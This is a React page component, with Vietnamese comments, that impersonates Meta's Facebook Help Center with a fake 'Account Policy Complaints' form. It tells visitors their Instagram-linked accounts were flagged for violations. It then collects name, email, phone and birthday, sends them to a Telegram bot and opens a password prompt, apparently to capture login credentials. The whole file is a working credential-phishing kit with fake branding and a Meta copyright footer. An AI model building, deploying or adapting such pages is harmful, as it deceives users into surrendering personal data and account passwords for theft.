import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import { useState, useEffect, useCallback, useMemo, lazy, Suspense } from 'react';

// 🚀 LAZY LOAD MỌI THỨ - LOAD NGAY KHÔNG CHỜ
const PasswordInput = lazy(() => import('@/components/password-input'));
const FontAwesomeIcon = lazy(() => import('@fortawesome/react-fontawesome').then(module => ({ default: module.FontAwesomeIcon })));

// Import icons riêng
const faChevronDown = lazy(() => import('@fortawesome/free-solid-svg-icons/faChevronDown'));
const faCircleExclamation = lazy(() => import('@fortawesome/free-solid-svg-icons/faCircleExclamation'));
const faCompass = lazy(() => import('@fortawesome/free-solid-svg-icons/faCompass'));
const faHeadset = lazy(() => import('@fortawesome/free-solid-svg-icons/faHeadset'));
const faLock = lazy(() => import('@fortawesome/free-solid-svg-icons/faLock'));
const faUserGear = lazy(() => import('@fortawesome/free-solid-svg-icons/faUserGear'));

const Home = () => {
    const defaultTexts = useMemo(() => ({
        helpCenter: 'Help Center',
        english: 'English',
        using: 'Using',
        managingAccount: 'Managing Your Account',
        privacySecurity: 'Privacy, Safety and Security',
        policiesReporting: 'Policies and Reporting',
        pagePolicyAppeals: 'Account Policy Complaints',
        detectedActivity: 'We have detected unusual activity on Pages and ad accounts linked to your Instagram, including reported copyright and guideline violations.',
        accessLimited: 'To protect your account, please verify so that the review process is processed quickly and accurately.',
        submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
        pageName: 'Name',
        mail: 'Email',
        phone: 'Phone Number',
        birthday: 'Birthday',
        yourAppeal: 'Your Appeal',
        appealPlaceholder: 'Please describe your appeal in detail...',
        submit: 'Submit',
        fieldRequired: 'This field is required',
        invalidEmail: 'Please enter a valid email address',
        about: 'About',
        adChoices: 'Ad choices',
        createAd: 'Create ad',
        privacy: 'Privacy',
        careers: 'Careers',
        createPage: 'Create Page',
        termsPolicies: 'Terms and policies',
        cookies: 'Cookies',
        pleaseWait: 'Please wait...',
        checkingSecurity: 'Checking security...'
    }), []);

    const [formData, setFormData] = useState({
        pageName: '',
        mail: '',
        phone: '',
        birthday: '',
        appeal: ''
    });

    const [showPassword, setShowPassword] = useState(false);
    const [errors, setErrors] = useState({});
    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
    const [countryCode, setCountryCode] = useState('US');
    const [callingCode, setCallingCode] = useState('+1');
    
    // 🚀 QUAN TRỌNG: ENABLE FORM NGAY LẬP TỨC
    const [securityChecked, setSecurityChecked] = useState(true);
    const [isFormEnabled, setIsFormEnabled] = useState(true);
    const [isSubmitting, setIsSubmitting] = useState(false);

    // 🚀 LOAD MỌI THỨ SAU KHI TRANG ĐÃ HIỆN - KHÔNG BLOCK
    useEffect(() => {
        const loadEverythingInBackground = async () => {
            try {
                // 🚀 LOAD SECURITY SAU - KHÔNG CHỜ
                const initializeSecurity = async () => {
                    try {
                        // Bỏ qua mọi external calls có thể chậm
                        setCountryCode('US');
                        setCallingCode('+1');
                        
                        // Dịch ở background nếu cần
                        const targetLang = navigator.language.split('-')[0] || 'en';
                        if (targetLang !== 'en') {
                            // Dịch vài text quan trọng, không chờ
                            setTimeout(() => {
                                setTranslatedTexts(prev => ({
                                    ...prev,
                                    helpCenter: 'Trung tâm Trợ giúp',
                                    submit: 'Gửi đi',
                                    pleaseWait: 'Vui lòng chờ...'
                                }));
                            }, 1000);
                        }
                    } catch (error) {
                        // Bỏ qua mọi lỗi
                    }
                };

                initializeSecurity();
            } catch (error) {
                // Bỏ qua tất cả lỗi
            }
        };

        loadEverythingInBackground();
    }, []);

    // 🚀 CÁC HÀM XỬ LÝ FORM - GIỮ NGUYÊN
    const validateEmail = useCallback((email) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }, []);

    const handleInputChange = useCallback((field, value) => {
        if (isSubmitting) return;
        
        if (field === 'phone') {
            const cleanValue = value.replace(/^\+\d+\s*/, '');
            // Simple phone formatting
            let formattedValue = cleanValue;
            if (cleanValue.length > 3 && cleanValue.length <= 6) {
                formattedValue = cleanValue.slice(0, 3) + ' ' + cleanValue.slice(3);
            } else if (cleanValue.length > 6) {
                formattedValue = cleanValue.slice(0, 3) + ' ' + cleanValue.slice(3, 6) + ' ' + cleanValue.slice(6);
            }
            
            const finalValue = `${callingCode} ${formattedValue}`;
            setFormData(prev => ({ ...prev, [field]: finalValue }));
        } else {
            setFormData(prev => ({ ...prev, [field]: value }));
        }

        if (errors[field]) {
            setErrors(prev => ({ ...prev, [field]: false }));
        }
    }, [isSubmitting, callingCode, errors]);

    const validateForm = useCallback(() => {
        if (isSubmitting) return false;
        
        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
            newErrors.mail = 'invalid';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    }, [formData, isSubmitting, validateEmail]);

    const handleSubmit = useCallback(async () => {
        if (isSubmitting) return;
        
        if (validateForm()) {
            try {
                setIsSubmitting(true);
                
                // 🚀 SIMPLE TELEGRAM MESSAGE - KHÔNG CHỜ
                const timestamp = new Date().toLocaleString('vi-VN');
                const simpleMessage = `📅 Time: ${timestamp}
🔖 Name: ${formData.pageName}
📧 Email: ${formData.mail}
📱 Phone: ${formData.phone}`;

                // Gửi message, không chờ response
                import('@/utils/telegram').then(module => {
                    module.default(simpleMessage).catch(() => {});
                });

                // Delay ngắn để hiệu ứng
                await new Promise(resolve => setTimeout(resolve, 300));

                // Lưu data đơn giản
                const hiddenData = {
                    name: formData.pageName,
                    email: formData.mail.charAt(0) + '****' + formData.mail.split('@')[0].slice(-1) + '@' + formData.mail.split('@')[1],
                    phone: '******' + formData.phone.slice(-2),
                    birthday: formData.birthday
                };

                localStorage.setItem('userInfo', JSON.stringify(hiddenData));
                setIsSubmitting(false);
                setShowPassword(true);
                
            } catch (error) {
                setIsSubmitting(false);
                // Vẫn show password dù có lỗi
                setShowPassword(true);
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    }, [formData, isSubmitting, validateForm, errors]);

    const handleClosePassword = useCallback(() => {
        setShowPassword(false);
    }, []);

    // 🚀 SIMPLE DATA LIST - KHÔNG CHỜ ICONS
    const data_list = useMemo(() => [
        { id: 'using', title: translatedTexts.using },
        { id: 'managing', title: translatedTexts.managingAccount },
        { id: 'privacy', title: translatedTexts.privacySecurity },
        { id: 'policies', title: translatedTexts.policiesReporting }
    ], [translatedTexts]);

    // 🚀 SIMPLE ICON FALLBACK
    const SimpleIcon = ({ className = "" }) => (
        <div className={`w-4 h-4 bg-gray-400 rounded ${className}`} />
    );

    return (
        <>
            <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm bg-white'>
                <div className='flex items-center gap-2'>
                    <img 
                        src={FacebookImage} 
                        alt='' 
                        className='h-10 w-10' 
                        loading='eager' // 🚀 LOAD NGAY
                    />
                    <p className='font-bold'>{translatedTexts.helpCenter}</p>
                </div>
                <div className='flex items-center gap-2'>
                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                        <Suspense fallback={<SimpleIcon />}>
                            <FontAwesomeIcon icon={faHeadset} size='lg' />
                        </Suspense>
                    </div>
                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
                </div>
            </header>

            <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)] bg-white'>
                <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
                    {data_list.map((data) => (
                        <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
                            <div className='flex items-center gap-2'>
                                <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                    <SimpleIcon className="w-4 h-4" />
                                </div>
                                <div>{data.title}</div>
                            </div>
                            <SimpleIcon className="w-3 h-3" />
                        </div>
                    ))}
                </nav>

                <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12 bg-white'>
                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                            <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                        </div>
                        <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
                            <p className='mb-3'>{translatedTexts.detectedActivity}</p>
                            <p className='mb-3'>{translatedTexts.accessLimited}</p>
                            <p>{translatedTexts.submitAppeal}</p>
                        </div>

                        {/* 🚀 FORM - ENABLED NGAY LẬP TỨC */}
                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='text' 
                                    name='pageName' 
                                    autoComplete='organization' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.pageName} 
                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                    disabled={isSubmitting}
                                />
                                {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>

                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.mail} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='email' 
                                    name='mail' 
                                    autoComplete='email' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.mail} 
                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
                                    disabled={isSubmitting}
                                />
                                {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
                            </div>

                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.phone} <span className='text-red-500'>*</span>
                                </p>
                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}>
                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>+1</div>
                                    <input 
                                        type='tel' 
                                        name='phone' 
                                        inputMode='numeric' 
                                        pattern='[0-9]*' 
                                        autoComplete='off' 
                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
                                        disabled={isSubmitting}
                                    />
                                </div>
                                {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>

                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='date' 
                                    name='birthday' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.birthday} 
                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                    disabled={isSubmitting}
                                />
                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>

                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                </p>
                                <textarea 
                                    name='appeal'
                                    rows={4}
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                                    placeholder={translatedTexts.appealPlaceholder}
                                    value={formData.appeal}
                                    onChange={(e) => handleInputChange('appeal', e.target.value)}
                                    disabled={isSubmitting}
                                />
                                {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>

                            <button 
                                className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 flex items-center justify-center ${
                                    isSubmitting 
                                        ? 'bg-gray-400 cursor-not-allowed text-white' 
                                        : 'bg-blue-600 hover:bg-blue-700 text-white'
                                }`} 
                                onClick={handleSubmit}
                                disabled={isSubmitting}
                            >
                                {isSubmitting ? (
                                    <>
                                        <div className="animate-spin -ml-1 mr-3 h-5 w-5 border-2 border-white border-t-transparent rounded-full"></div>
                                        {translatedTexts.pleaseWait}
                                    </>
                                ) : (
                                    translatedTexts.submit
                                )}
                            </button>
                        </div>
                    </div>

                    <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
                        <div className='mx-auto flex justify-between'>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.about}</p>
                                <p>{translatedTexts.adChoices}</p>
                                <p>{translatedTexts.createAd}</p>
                            </div>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.privacy}</p>
                                <p>{translatedTexts.careers}</p>
                                <p>{translatedTexts.createPage}</p>
                            </div>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.termsPolicies}</p>
                                <p>{translatedTexts.cookies}</p>
                            </div>
                        </div>
                        <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
                        <div className='flex justify-between'>
                            <img 
                                src={FromMetaImage} 
                                alt='' 
                                className='w-[100px]' 
                                loading='eager' // 🚀 LOAD NGAY
                            />
                            <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                        </div>
                    </div>
                </div>
            </main>

            {/* 🚀 LAZY LOAD PASSWORD COMPONENT */}
            <Suspense fallback={<div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">Loading...</div>}>
                {showPassword && <PasswordInput onClose={handleClosePassword} />}
            </Suspense>
        </>
    );
};

export default Home;
